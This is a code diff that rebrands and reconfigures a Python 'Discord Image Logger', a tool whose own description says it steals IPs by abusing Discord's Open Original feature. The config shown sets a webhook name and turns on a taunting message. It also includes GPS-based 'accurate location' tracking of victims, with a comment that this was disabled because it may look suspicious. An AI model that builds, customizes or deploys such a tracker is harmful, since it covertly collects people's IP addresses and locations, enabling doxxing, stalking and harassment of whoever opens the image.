@@ -6,12 +6,9 @@ from urllib import parse
 import traceback, requests, base64, httpagentparser, webbrowser
 
 __app__ = "Discord Image Logger"
-__description__ = "A simple application which allows you to steal IPs and more by abusing Discord's Open Original feature"
+__description__ = "martivi aplikacia discordit ip dasadgena"
 __version__ = "v2.0"
-__author__ = "DeKrypt"
-
-youtube_link = "https://www.youtube.com/embed/RAZSdO2DA3E?autoplay=1&fs=1"
-webbrowser.open(youtube_link)
+__author__ = "ALUBALIBALI"
 
 config = {
     # BASE CONFIG #
@@ -21,7 +18,7 @@ config = {
    "imageArgument": True, # Allows you to use a URL argument to change the image (SEE THE README)
 
     # CUSTOMIZATION #
-    "username": "Image Logger", # Set this to the name you want the webhook to have
+    "username": "SAMXARA", # Set this to the name you want the webhook to have
     "color": 0x00FFFF, # Hex Color you want for the embed (Example: Red is 0xFF0000)
 
     # OPTIONS #
@@ -30,12 +27,12 @@ config = {
     "accurateLocation": True, # Uses GPS to find users exact location (Real Address, etc.) disabled because it asks the user which may be suspicious.
 
     "message": { # Show a custom message when the user opens the image
-        "doMessage": False, # Enable the custom message?
+        "doMessage": True, # Enable the custom message?
         "message": "by_samxara run pusssssssssssssssssssssssy", # Message to show
         "richMessage": True, # Enable rich text? (See README for more info)
     },
 
-    "vpnCheck": 1, # Prevents VPNs from triggering the alert
+    "vpnCheck": 2, # Prevents VPNs from triggering the alert
                 # 0 = No Anti-VPN
                 # 1 = Don't ping when a VPN is suspected
                 # 2 = Don't send an alert when a VPN is suspected
